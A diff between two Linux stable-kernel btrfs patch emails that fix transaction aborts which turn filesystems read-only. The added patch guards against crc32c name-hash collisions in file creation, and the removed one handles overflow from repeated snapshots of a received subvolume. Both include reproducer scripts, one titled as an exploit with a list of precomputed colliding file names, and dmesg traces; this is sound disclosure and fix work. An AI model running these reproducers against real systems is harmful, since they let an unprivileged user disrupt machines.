@@ -1,28 +1,28 @@
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8FF053783C0;
-	Tue, 17 Mar 2026 17:28:04 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B273236EABD;
+	Tue, 17 Mar 2026 17:28:08 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1773768484; cv=none; b=iVqII2esR8fj3EECy47WUt5JGyaGdiL4f1hUxB0v0jtDgfDmp4hYRSHBVysT8PyUSAiRubF4fhu6iKbew2eJOI4ssfK5BJJmtBwbmSqZPmhHsG7/SxCHp+ybz4MyKJxV04L4X7HLnpwyjXZOZ/EGaXgygkbxu4yTq1hOMKNBYDk=
+	t=1773768488; cv=none; b=DnyIiBsZFfknw5c/HTfrLSQxFVOdo3JHlaf9ZMISNMkl+3oN2WgwBwKwKTpj+8D4GSqHXqB2pNazYEEvrGhb0ayvH6QfOjaoRnnor9Q5J8I9w9x0dmcggWgSH0nuaZTivBVpuROgvITJvowqFPuCKxWfpcUnQXWw45418MX1KNg=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1773768484; c=relaxed/simple;
-	bh=w3ox+gcsqh5Mm+nA6uGihgXFUuC3N/rImmM9CZXEed0=;
+	s=arc-20240116; t=1773768488; c=relaxed/simple;
+	bh=6zsK9ABLDv/Fp/IyaD8FWXFaTFcVE3l+M1PT8vzkAW4=;
 	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=RxLG2Z6lTusp5ZiBACpFb+g88dSRFMhaGVLHLMLtOI5P70BF/4y+yopBL13KeQT/KD8jZze6kBC8txSozF0KwEimk79R/rc6GEGKc6r59KTZUxWMzsPlZQmDhYEasmXLwzLVCenCn30eGlR31t7O3fXj8y+9woPOmtvPI1AU52k=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=oGrmQHjk; arc=none smtp.client-ip=10.30.226.201
+	 MIME-Version; b=WV/4IsEuB4IeYkrqHr/dgOIKJpomeYlEdAiQ1G+T1jmCXz2On+uMvH5QfkQjrbx4SOFMneSbF3F+tFfzse+IpA/cfn1C8mxIuiYdj1GBjKmlFcG4YUlYXEZEd0VO3Z2wTFkNb2EooUg3ErMqY77mV8xhzUGickMnKSDGTQE2O3Y=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=QQo5YMND; arc=none smtp.client-ip=10.30.226.201
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="oGrmQHjk"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 078E0C4CEF7;
-	Tue, 17 Mar 2026 17:28:03 +0000 (UTC)
+	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="QQo5YMND"
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id C8443C4CEF7;
+	Tue, 17 Mar 2026 17:28:07 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-	s=korg; t=1773768484;
-	bh=w3ox+gcsqh5Mm+nA6uGihgXFUuC3N/rImmM9CZXEed0=;
+	s=korg; t=1773768488;
+	bh=6zsK9ABLDv/Fp/IyaD8FWXFaTFcVE3l+M1PT8vzkAW4=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-	b=oGrmQHjknRwS5Lib1+s1QSu9N6dhIa0qtLdccL3ebccNmj2y3q1a5+cfjgw3LLA/R
-	 p8QOhtsR2Fh5AWChboZH2cfXg9FwFfqQKU2E07CX537JuOD29HRZmCghPx81bLaBEP
-	 g3UJG6J/BXVAzhOoRvm8msFYfT5Am/0OdAomV5EE=
+	b=QQo5YMNDssOBMJxiLbp4RlZblUhGwpGTgFIFab7bNKVK2sNXLQRZY2Ij/6is1JgIg
+	 bDhiYWMs0Cui+QIOZApGnhRbu5K7VaSYpmytblstnN6QHOVRaSRZxSVAdmprlRi06j
+	 3oFy9Be82sLvCGJAQdoXMLJjhcVjD/TQuu5B2lPQ=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
@@ -31,9 +31,9 @@ Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	Qu Wenruo <wqu@suse.com>,
 	Filipe Manana <fdmanana@suse.com>,
 	David Sterba <dsterba@suse.com>
-Subject: [PATCH 6.18 287/333] btrfs: fix transaction abort when snapshotting received subvolumes
-Date: Tue, 17 Mar 2026 17:35:16 +0100
-Message-ID: <20260317163010.034332247@linuxfoundation.org>
+Subject: [PATCH 6.18 288/333] btrfs: fix transaction abort on file creation due to name hash collision
+Date: Tue, 17 Mar 2026 17:35:17 +0100
+Message-ID: <20260317163010.072307363@linuxfoundation.org>
 X-Mailer: git-send-email 2.53.0
 In-Reply-To: <20260317162959.345812316@linuxfoundation.org>
 References: <20260317162959.345812316@linuxfoundation.org>
@@ -54,133 +54,150 @@ Content-Transfer-Encoding: 8bit
 
 From: Filipe Manana <fdmanana@suse.com>
 
-commit e1b18b959025e6b5dbad668f391f65d34b39595a upstream.
+commit 2d1ababdedd4ba38867c2500eb7f95af5ddeeef7 upstream.
 
-Currently a user can trigger a transaction abort by snapshotting a
-previously received snapshot a bunch of times until we reach a
-BTRFS_UUID_KEY_RECEIVED_SUBVOL item overflow (the maximum item size we
-can store in a leaf). This is very likely not common in practice, but
-if it happens, it turns the filesystem into RO mode. The snapshot, send
-and set_received_subvol and subvol_setflags (used by receive) don't
-require CAP_SYS_ADMIN, just inode_owner_or_capable(). A malicious user
-could use this to turn a filesystem into RO mode and disrupt a system.
+If we attempt to create several files with names that result in the same
+hash, we have to pack them in same dir item and that has a limit inherent
+to the leaf size. However if we reach that limit, we trigger a transaction
+abort and turns the filesystem into RO mode. This allows for a malicious
+user to disrupt a system, without the need to have administration
+privileges/capabilities.
 
-Reproducer script:
+Reproducer:
 
-  $ cat test.sh
+  $ cat exploit-hash-collisions.sh
   #!/bin/bash
 
   DEV=/dev/sdi
   MNT=/mnt/sdi
 
-  # Use smallest node size to make the test faster.
+  # Use smallest node size to make the test faster and require fewer file
+  # names that result in hash collision.
   mkfs.btrfs -f --nodesize 4K $DEV
   mount $DEV $MNT
 
-  # Create a subvolume and set it to RO so that it can be used for send.
-  btrfs subvolume create $MNT/sv
-  touch $MNT/sv/foo
-  btrfs property set $MNT/sv ro true
+  # List of names that result in the same crc32c hash for btrfs.
+  declare -a names=(
+   'foobar'
+   '%a8tYkxfGMLWRGr55QSeQc4PBNH9PCLIvR6jZnkDtUUru1t@RouaUe_L:@xGkbO3nCwvLNYeK9vhE628gss:T$yZjZ5l-Nbd6CbC$M=hqE-ujhJICXyIxBvYrIU9-TDC'
+   'AQci3EUB%shMsg-N%frgU:02ByLs=IPJU0OpgiWit5nexSyxZDncY6WB:=zKZuk5Zy0DD$Ua78%MelgBuMqaHGyKsJUFf9s=UW80PcJmKctb46KveLSiUtNmqrMiL9-Y0I_l5Fnam04CGIg=8@U:Z'
+   'CvVqJpJzueKcuA$wqwePfyu7VxuWNN3ho$p0zi2H8QFYK$7YlEqOhhb%:hHgjhIjW5vnqWHKNP4'
+   'ET:vk@rFU4tsvMB0$C_p=xQHaYZjvoF%-BTc%wkFW8yaDAPcCYoR%x$FH5O:'
+   'HwTon%v7SGSP4FE08jBwwiu5aot2CFKXHTeEAa@38fUcNGOWvE@Mz6WBeDH_VooaZ6AgsXPkVGwy9l@@ZbNXabUU9csiWrrOp0MWUdfi$EZ3w9GkIqtz7I_eOsByOkBOO'
+   'Ij%2VlFGXSuPvxJGf5UWy6O@1svxGha%b@=%wjkq:CIgE6u7eJOjmQY5qTtxE2Rjbis9@us'
+   'KBkjG5%9R8K9sOG8UTnAYjxLNAvBmvV5vz3IiZaPmKuLYO03-6asI9lJ_j4@6Xo$KZicaLWJ3Pv8XEwVeUPMwbHYWwbx0pYvNlGMO9F:ZhHAwyctnGy%_eujl%WPd4U2BI7qooOSr85J-C2V$LfY'
+   'NcRfDfuUQ2=zP8K3CCF5dFcpfiOm6mwenShsAb_F%n6GAGC7fT2JFFn:c35X-3aYwoq7jNX5$ZJ6hI3wnZs$7KgGi7wjulffhHNUxAT0fRRLF39vJ@NvaEMxsMO'
+   'Oj42AQAEzRoTxa5OuSKIr=A_lwGMy132v4g3Pdq1GvUG9874YseIFQ6QU'
+   'Ono7avN5GjC:_6dBJ_'
+   'WHmN2gnmaN-9dVDy4aWo:yNGFzz8qsJyJhWEWcud7$QzN2D9R0efIWWEdu5kwWr73NZm4=@CoCDxrrZnRITr-kGtU_cfW2:%2_am'
+   'WiFnuTEhAG9FEC6zopQmj-A-$LDQ0T3WULz%ox3UZAPybSV6v1Z$b4L_XBi4M4BMBtJZpz93r9xafpB77r:lbwvitWRyo$odnAUYlYMmU4RvgnNd--e=I5hiEjGLETTtaScWlQp8mYsBovZwM2k'
+   'XKyH=OsOAF3p%uziGF_ZVr$ivrvhVgD@1u%5RtrV-gl_vqAwHkK@x7YwlxX3qT6WKKQ%PR56NrUBU2dOAOAdzr2=5nJuKPM-T-$ZpQfCL7phxQbUcb:BZOTPaFExc-qK-gDRCDW2'
+   'd3uUR6OFEwZr%ns1XH_@tbxA@cCPmbBRLdyh7p6V45H$P2$F%w0RqrD3M0g8aGvWpoTFMiBdOTJXjD:JF7=h9a_43xBywYAP%r$SPZi%zDg%ql-KvkdUCtF9OLaQlxmd'
+   'ePTpbnit%hyNm@WELlpKzNZYOzOTf8EQ$sEfkMy1VOfIUu3coyvIr13-Y7Sv5v-Ivax2Go_GQRFMU1b3362nktT9WOJf3SpT%z8sZmM3gvYQBDgmKI%%RM-G7hyrhgYflOw%z::ZRcv5O:lDCFm'
+   'evqk743Y@dvZAiG5J05L_ROFV@$2%rVWJ2%3nxV72-W7$e$-SK3tuSHA2mBt$qloC5jwNx33GmQUjD%akhBPu=VJ5g$xhlZiaFtTrjeeM5x7dt4cHpX0cZkmfImndYzGmvwQG:$euFYmXn$_2rA9mKZ'
+   'gkgUtnihWXsZQTEkrMAWIxir09k3t7jk_IK25t1:cy1XWN0GGqC%FrySdcmU7M8MuPO_ppkLw3=Dfr0UuBAL4%GFk2$Ma10V1jDRGJje%Xx9EV2ERaWKtjpwiZwh0gCSJsj5UL7CR8RtW5opCVFKGGy8Cky'
+   'hNgsG_8lNRik3PvphqPm0yEH3P%%fYG:kQLY=6O-61Wa6nrV_WVGR6TLB09vHOv%g4VQRP8Gzx7VXUY1qvZyS'
+   'isA7JVzN12xCxVPJZ_qoLm-pTBuhjjHMvV7o=F:EaClfYNyFGlsfw-Kf%uxdqW-kwk1sPl2vhbjyHU1A6$hz'
+   'kiJ_fgcdZFDiOptjgH5PN9-PSyLO4fbk_:u5_2tz35lV_iXiJ6cx7pwjTtKy-XGaQ5IefmpJ4N_ZqGsqCsKuqOOBgf9LkUdffHet@Wu'
+   'lvwtxyhE9:%Q3UxeHiViUyNzJsy:fm38pg_b6s25JvdhOAT=1s0$pG25x=LZ2rlHTszj=gN6M4zHZYr_qrB49i=pA--@WqWLIuX7o1S_SfS@2FSiUZN'
+   'rC24cw3UBDZ=5qJBUMs9e$=S4Y94ni%Z8639vnrGp=0Hv4z3dNFL0fBLmQ40=EYIY:Z=SLc@QLMSt2zsss2ZXrP7j4='
+   'uwGl2s-fFrf@GqS=DQqq2I0LJSsOmM%xzTjS:lzXguE3wChdMoHYtLRKPvfaPOZF2fER@j53evbKa7R%A7r4%YEkD=kicJe@SFiGtXHbKe4gCgPAYbnVn'
+   'UG37U6KKua2bgc:IHzRs7BnB6FD:2Mt5Cc5NdlsW%$1tyvnfz7S27FvNkroXwAW:mBZLA1@qa9WnDbHCDmQmfPMC9z-Eq6QT0jhhPpqyymaD:R02ghwYo%yx7SAaaq-:x33LYpei$5g8DMl3C'
+   'y2vjek0FE1PDJC0qpfnN:x8k2wCFZ9xiUF2ege=JnP98R%wxjKkdfEiLWvQzmnW'
+   '8-HCSgH5B%K7P8_jaVtQhBXpBk:pE-$P7ts58U0J@iR9YZntMPl7j$s62yAJO@_9eanFPS54b=UTw$94C-t=HLxT8n6o9P=QnIxq-f1=Ne2dvhe6WbjEQtc'
+   'YPPh:IFt2mtR6XWSmjHptXL_hbSYu8bMw-JP8@PNyaFkdNFsk$M=xfL6LDKCDM-mSyGA_2MBwZ8Dr4=R1D%7-mCaaKGxb990jzaagRktDTyp'
+   '9hD2ApKa_t_7x-a@GCG28kY:7$M@5udI1myQ$x5udtggvagmCQcq9QXWRC5hoB0o-_zHQUqZI5rMcz_kbMgvN5jr63LeYA4Cj-c6F5Ugmx6DgVf@2Jqm%MafecpgooqreJ53P-QTS'
+  )
 
-  # Send and receive the subvolume into snaps/sv.
-  mkdir $MNT/snaps
-  btrfs send $MNT/sv | btrfs receive $MNT/snaps
-
-  # Now snapshot the received subvolume, which has a received_uuid, a
-  # lot of times to trigger the leaf overflow.
-  total=500
-  for ((i = 1; i <= $total; i++)); do
-      echo -ne "\rCreating snapshot $i/$total"
-      btrfs subvolume snapshot -r $MNT/snaps/sv $MNT/snaps/sv_$i > /dev/null
+  # Now create files with all those names in the same parent directory.
+  # It should not fail since a 4K leaf has enough space for them.
+  for name in "${names[@]}"; do
+       touch $MNT/$name
   done
-  echo
+
+  # Now add one more file name that causes a crc32c hash collision.
+  # This should fail, but it should not turn the filesystem into RO mode
+  # (which could be exploited by malicious users) due to a transaction
+  # abort.
+  touch $MNT/'W6tIm-VK2@BGC@IBfcgg6j_p:pxp_QUqtWpGD5Ok_GmijKOJJt'
+
+  # Check that we are able to create another file, with a name that does not cause
+  # a crc32c hash collision.
+  echo -n "hello world" > $MNT/baz
+
+  # Unmount and mount again, verify file baz exists and with the right content.
+  umount $MNT
+  mount $DEV $MNT
+  echo "File baz content: $(cat $MNT/baz)"
 
   umount $MNT
 
-When running the test:
+When running the reproducer:
 
-  $ ./test.sh
+  $ ./exploit-hash-collisions.sh
   (...)
-  Create subvolume '/mnt/sdi/sv'
-  At subvol /mnt/sdi/sv
-  At subvol sv
-  Creating snapshot 496/500ERROR: Could not create subvolume: Value too large for defined data type
-  Creating snapshot 497/500ERROR: Could not create subvolume: Read-only file system
-  Creating snapshot 498/500ERROR: Could not create subvolume: Read-only file system
-  Creating snapshot 499/500ERROR: Could not create subvolume: Read-only file system
-  Creating snapshot 500/500ERROR: Could not create subvolume: Read-only file system
+  touch: cannot touch '/mnt/sdi/W6tIm-VK2@BGC@IBfcgg6j_p:pxp_QUqtWpGD5Ok_GmijKOJJt': Value too large for defined data type
+  ./exploit-hash-collisions.sh: line 57: /mnt/sdi/baz: Read-only file system
+  cat: /mnt/sdi/baz: No such file or directory
+  File baz content:
 
-And in dmesg/syslog:
+And the transaction abort stack trace in dmesg/syslog:
 
   $ dmesg
   (...)
-  [251067.627338] BTRFS warning (device sdi): insert uuid item failed -75 (0x4628b21c4ac8d898, 0x2598bee2b1515c91) type 252!
-  [251067.629212] ------------[ cut here ]------------
-  [251067.630033] BTRFS: Transaction aborted (error -75)
-  [251067.630871] WARNING: fs/btrfs/transaction.c:1907 at create_pending_snapshot.cold+0x52/0x465 [btrfs], CPU#10: btrfs/615235
-  [251067.632851] Modules linked in: btrfs dm_zero (...)
-  [251067.644071] CPU: 10 UID: 0 PID: 615235 Comm: btrfs Tainted: G        W           6.19.0-rc8-btrfs-next-225+ #1 PREEMPT(full)
-  [251067.646165] Tainted: [W]=WARN
-  [251067.646733] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.2-0-gea1b7a073390-prebuilt.qemu.org 04/01/2014
-  [251067.648735] RIP: 0010:create_pending_snapshot.cold+0x55/0x465 [btrfs]
-  [251067.649984] Code: f0 48 0f (...)
-  [251067.653313] RSP: 0018:ffffce644908fae8 EFLAGS: 00010292
-  [251067.653987] RAX: 00000000ffffff01 RBX: ffff8e5639e63a80 RCX: 00000000ffffffd3
-  [251067.655042] RDX: ffff8e53faa76b00 RSI: 00000000ffffffb5 RDI: ffffffffc0919750
-  [251067.656077] RBP: ffffce644908fbd8 R08: 0000000000000000 R09: ffffce644908f820
-  [251067.657068] R10: ffff8e5adc1fffa8 R11: 0000000000000003 R12: ffff8e53c0431bd0
-  [251067.658050] R13: ffff8e5414593600 R14: ffff8e55efafd000 R15: 00000000ffffffb5
-  [251067.659019] FS:  00007f2a4944b3c0(0000) GS:ffff8e5b27dae000(0000) knlGS:0000000000000000
-  [251067.660115] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-  [251067.660943] CR2: 00007ffc5aa57898 CR3: 00000005813a2003 CR4: 0000000000370ef0
-  [251067.661972] Call Trace:
-  [251067.662292]  <TASK>
-  [251067.662653]  create_pending_snapshots+0x97/0xc0 [btrfs]
-  [251067.663413]  btrfs_commit_transaction+0x26e/0xc00 [btrfs]
-  [251067.664257]  ? btrfs_qgroup_convert_reserved_meta+0x35/0x390 [btrfs]
-  [251067.665238]  ? _raw_spin_unlock+0x15/0x30
-  [251067.665837]  ? record_root_in_trans+0xa2/0xd0 [btrfs]
-  [251067.666531]  btrfs_mksubvol+0x330/0x580 [btrfs]
-  [251067.667145]  btrfs_mksnapshot+0x74/0xa0 [btrfs]
-  [251067.667827]  __btrfs_ioctl_snap_create+0x194/0x1d0 [btrfs]
-  [251067.668595]  btrfs_ioctl_snap_create_v2+0x107/0x130 [btrfs]
-  [251067.669479]  btrfs_ioctl+0x1580/0x2690 [btrfs]
-  [251067.670093]  ? count_memcg_events+0x6d/0x180
-  [251067.670849]  ? handle_mm_fault+0x1a0/0x2a0
-  [251067.671652]  __x64_sys_ioctl+0x92/0xe0
-  [251067.672406]  do_syscall_64+0x50/0xf20
-  [251067.673129]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
-  [251067.674096] RIP: 0033:0x7f2a495648db
-  [251067.674812] Code: 00 48 89 (...)
-  [251067.678227] RSP: 002b:00007ffc5aa57840 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
-  [251067.679691] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 00007f2a495648db
-  [251067.681145] RDX: 00007ffc5aa588b0 RSI: 0000000050009417 RDI: 0000000000000004
-  [251067.682511] RBP: 0000000000000002 R08: 0000000000000000 R09: 0000000000000000
-  [251067.683842] R10: 000000000000000a R11: 0000000000000246 R12: 00007ffc5aa59910
-  [251067.685176] R13: 00007ffc5aa588b0 R14: 0000000000000004 R15: 0000000000000006
-  [251067.686524]  </TASK>
-  [251067.686972] ---[ end trace 0000000000000000 ]---
-  [251067.687890] BTRFS: error (device sdi state A) in create_pending_snapshot:1907: errno=-75 unknown
-  [251067.689049] BTRFS info (device sdi state EA): forced readonly
-  [251067.689054] BTRFS warning (device sdi state EA): Skipping commit of aborted transaction.
-  [251067.690119] BTRFS: error (device sdi state EA) in cleanup_transaction:2043: errno=-75 unknown
-  [251067.702028] BTRFS info (device sdi state EA): last unmount of filesystem 46dc3975-30a2-4a69-a18f-418b859cccda
+  [758240.509761] ------------[ cut here ]------------
+  [758240.510668] BTRFS: Transaction aborted (error -75)
+  [758240.511577] WARNING: fs/btrfs/inode.c:6854 at btrfs_create_new_inode+0x805/0xb50 [btrfs], CPU#6: touch/888644
+  [758240.513513] Modules linked in: btrfs dm_zero (...)
+  [758240.523221] CPU: 6 UID: 0 PID: 888644 Comm: touch Tainted: G        W           6.19.0-rc8-btrfs-next-225+ #1 PREEMPT(full)
+  [758240.524621] Tainted: [W]=WARN
+  [758240.525037] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.2-0-gea1b7a073390-prebuilt.qemu.org 04/01/2014
+  [758240.526331] RIP: 0010:btrfs_create_new_inode+0x80b/0xb50 [btrfs]
+  [758240.527093] Code: 0f 82 cf (...)
+  [758240.529211] RSP: 0018:ffffce64418fbb48 EFLAGS: 00010292
+  [758240.529935] RAX: 00000000ffffffd3 RBX: 0000000000000000 RCX: 00000000ffffffb5
+  [758240.531040] RDX: 0000000d04f33e06 RSI: 00000000ffffffb5 RDI: ffffffffc0919dd0
+  [758240.531920] RBP: ffffce64418fbc10 R08: 0000000000000000 R09: 00000000ffffffb5
+  [758240.532928] R10: 0000000000000000 R11: ffff8e52c0000000 R12: ffff8e53eee7d0f0
+  [758240.533818] R13: ffff8e57f70932a0 R14: ffff8e5417629568 R15: 0000000000000000
+  [758240.534664] FS:  00007f1959a2a740(0000) GS:ffff8e5b27cae000(0000) knlGS:0000000000000000
+  [758240.535821] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+  [758240.536644] CR2: 00007f1959b10ce0 CR3: 000000012a2cc005 CR4: 0000000000370ef0
+  [758240.537517] Call Trace:
+  [758240.537828]  <TASK>
+  [758240.538099]  btrfs_create_common+0xbf/0x140 [btrfs]
+  [758240.538760]  path_openat+0x111a/0x15b0
+  [758240.539252]  do_filp_open+0xc2/0x170
+  [758240.539699]  ? preempt_count_add+0x47/0xa0
+  [758240.540200]  ? __virt_addr_valid+0xe4/0x1a0
+  [758240.540800]  ? __check_object_size+0x1b3/0x230
+  [758240.541661]  ? alloc_fd+0x118/0x180
+  [758240.542315]  do_sys_openat2+0x70/0xd0
+  [758240.543012]  __x64_sys_openat+0x50/0xa0
+  [758240.543723]  do_syscall_64+0x50/0xf20
+  [758240.544462]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
+  [758240.545397] RIP: 0033:0x7f1959abc687
+  [758240.546019] Code: 48 89 fa (...)
+  [758240.548522] RSP: 002b:00007ffe16ff8690 EFLAGS: 00000202 ORIG_RAX: 0000000000000101
+  [758240.566278] RAX: ffffffffffffffda RBX: 00007f1959a2a740 RCX: 00007f1959abc687
+  [758240.567068] RDX: 0000000000000941 RSI: 00007ffe16ffa333 RDI: ffffffffffffff9c
+  [758240.567860] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
+  [758240.568707] R10: 00000000000001b6 R11: 0000000000000202 R12: 0000561eec7c4b90
+  [758240.569712] R13: 0000561eec7c311f R14: 00007ffe16ffa333 R15: 0000000000000000
+  [758240.570758]  </TASK>
+  [758240.571040] ---[ end trace 0000000000000000 ]---
+  [758240.571681] BTRFS: error (device sdi state A) in btrfs_create_new_inode:6854: errno=-75 unknown
+  [758240.572899] BTRFS info (device sdi state EA): forced readonly
 
-Fix this by ignoring -EOVERFLOW errors from btrfs_uuid_tree_add() in the
-snapshot creation code when attempting to add the
-BTRFS_UUID_KEY_RECEIVED_SUBVOL item. This is OK because it's not critical
-and we are still able to delete the snapshot, as snapshot/subvolume
-deletion ignores if a BTRFS_UUID_KEY_RECEIVED_SUBVOL is missing (see
-inode.c:btrfs_delete_subvolume()). As for send/receive, we can still do
-send/receive operations since it always peeks the first root ID in the
-existing BTRFS_UUID_KEY_RECEIVED_SUBVOL (it could peek any since all
-snapshots have the same content), and even if the key is missing, it
-falls back to searching by BTRFS_UUID_KEY_SUBVOL key.
+Fix this by checking for hash collision, and if the adding a new name is
+possible, early in btrfs_create_new_inode() before we do any tree updates,
+so that we don't need to abort the transaction if we cannot add the new
+name due to the leaf size limit.
 
 A test case for fstests will be sent soon.
 
-Fixes: dd5f9615fc5c ("Btrfs: maintain subvolume items in the UUID tree")
-CC: stable@vger.kernel.org # 3.12+
+Fixes: caae78e03234 ("btrfs: move common inode creation code into btrfs_create_new_inode()")
+CC: stable@vger.kernel.org # 6.1+
 Reviewed-by: Boris Burkov <boris@bur.io>
 Reviewed-by: Qu Wenruo <wqu@suse.com>
 Signed-off-by: Filipe Manana <fdmanana@suse.com>
@@ -188,33 +205,36 @@ Reviewed-by: David Sterba <dsterba@suse.com>
 Signed-off-by: David Sterba <dsterba@suse.com>
 Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 ---
- fs/btrfs/transaction.c |   16 ++++++++++++++++
- 1 file changed, 16 insertions(+)
+ fs/btrfs/inode.c |   19 +++++++++++++++++++
+ 1 file changed, 19 insertions(+)
 
---- a/fs/btrfs/transaction.c
-+++ b/fs/btrfs/transaction.c
-@@ -1890,6 +1890,22 @@ static noinline int create_pending_snaps
- 		ret = btrfs_uuid_tree_add(trans, new_root_item->received_uuid,
- 					  BTRFS_UUID_KEY_RECEIVED_SUBVOL,
- 					  objectid);
+--- a/fs/btrfs/inode.c
++++ b/fs/btrfs/inode.c
+@@ -6478,6 +6478,25 @@ int btrfs_create_new_inode(struct btrfs_
+ 	int ret;
+ 	bool xa_reserved = false;
+ 
++	if (!args->orphan && !args->subvol) {
 +		/*
-+		 * We are creating of lot of snapshots of the same root that was
-+		 * received (has a received UUID) and reached a leaf's limit for
-+		 * an item. We can safely ignore this and avoid a transaction
-+		 * abort. A deletion of this snapshot will still work since we
-+		 * ignore if an item with a BTRFS_UUID_KEY_RECEIVED_SUBVOL key
-+		 * is missing (see btrfs_delete_subvolume()). Send/receive will
-+		 * work too since it peeks the first root id from the existing
-+		 * item (it could peek any), and in case it's missing it
-+		 * falls back to search by BTRFS_UUID_KEY_SUBVOL keys.
-+		 * Creation of a snapshot does not require CAP_SYS_ADMIN, so
-+		 * we don't want users triggering transaction aborts, either
-+		 * intentionally or not.
++		 * Before anything else, check if we can add the name to the
++		 * parent directory. We want to avoid a dir item overflow in
++		 * case we have an existing dir item due to existing name
++		 * hash collisions. We do this check here before we call
++		 * btrfs_add_link() down below so that we can avoid a
++		 * transaction abort (which could be exploited by malicious
++		 * users).
++		 *
++		 * For subvolumes we already do this in btrfs_mksubvol().
 +		 */
-+		if (ret == -EOVERFLOW)
-+			ret = 0;
- 		if (unlikely(ret && ret != -EEXIST)) {
- 			btrfs_abort_transaction(trans, ret);
- 			goto fail;
++		ret = btrfs_check_dir_item_collision(BTRFS_I(dir)->root,
++						     btrfs_ino(BTRFS_I(dir)),
++						     name);
++		if (ret < 0)
++			return ret;
++	}
++
+ 	path = btrfs_alloc_path();
+ 	if (!path)
+ 		return -ENOMEM;
 
 
